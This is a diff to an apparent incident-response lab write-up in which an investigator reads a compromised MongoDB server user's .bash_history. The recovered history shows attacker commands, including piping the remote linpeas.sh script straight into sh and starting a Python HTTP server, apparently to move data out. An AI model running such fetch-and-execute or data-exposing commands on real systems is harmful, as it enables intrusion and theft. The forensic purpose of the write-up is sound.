@@ -5499,8 +5499,34 @@ When a user works interactively in a Bash shell, every command they run gets rec
 
 You already confirmed `home/mongoadmin` exists under `[root]/` in the tree structure, so that's exactly where to look.
 
-**Next step:** Read that file. From inside the `[root]` folder, run:
+**Next step:** Read that file. From inside the `[root]/home/mongoadmin` folder, run:
 
+**Command:** `cat .bash_history`
+
+**Result:**
+
+```shell
+┌──(kali㉿kali)-[~/…/uac-mongodbsync-linux-triage/[root]/home/mongoadmin]
+└─$ cat .bash_history 
+ls -la
+whoami
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+cd /data
+cd ~
+ls -al
+cd /
+ls
+cd /var/lib/mongodb/
+ls -la
+cd ../
+which zip
+apt install zip
+zip
+cd mongodb/
+python3
+python3 -m http.server 6969
+exit
+```
 
 <div align="center">
 <br>
